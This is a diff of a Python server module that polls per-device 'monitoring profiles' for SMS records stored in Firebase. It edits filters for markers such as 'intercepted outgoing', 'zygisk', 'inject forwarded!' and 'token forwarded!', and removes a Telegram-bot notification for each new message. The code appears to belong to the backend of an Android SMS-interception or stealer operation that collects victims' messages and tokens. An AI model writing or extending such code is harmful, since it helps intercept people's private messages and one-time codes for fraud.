@@ -38,16 +38,7 @@ MAX_SEEN_KEYS = 500
 OUTGOING_LOG_MARKERS = (
     "intercepted outgoing",
     "zygisk",
-    "outgoing sms sent",
     "outgoing sms",
-    "__out__",
-)
-BOT_CARD_MARKERS = (
-    "inject forwarded!",
-    "token forwarded!",
-    "outgoing sms sent!",
-    "auto-stopped",
-    "⏱ queued",
 )
 
 
@@ -106,13 +97,9 @@ def mark_sms_keys_seen(device: Device, keys: set[str]) -> None:
 def _is_outgoing_firebase_log(sender: str, body: str) -> bool:
     sender_l = (sender or "").lower()
     body_l = (body or "").lower()
-    if sender_l == "__out__":
-        return True
     if any(marker in sender_l for marker in OUTGOING_LOG_MARKERS):
         return True
     if any(marker in body_l for marker in OUTGOING_LOG_MARKERS):
-        return True
-    if any(marker in body_l for marker in BOT_CARD_MARKERS):
         return True
     return False
 
@@ -263,10 +250,6 @@ async def _inject_before_notify(profile: MonitorProfile, device: Device, sender:
 
 
 async def poll_monitoring_profiles_once() -> int:
-    import asyncio
-
-    from app.telegram_bot import notify_new_sms_dm_only
-
     db = SessionLocal()
     processed = 0
     try:
@@ -322,7 +305,6 @@ async def poll_monitoring_profiles_once() -> int:
                 db.commit()
                 new_keys.add(record["firebase_key"])
                 processed += 1
-                asyncio.create_task(notify_new_sms_dm_only(sms))
 
             if new_keys:
                 mark_sms_keys_seen(device, new_keys)
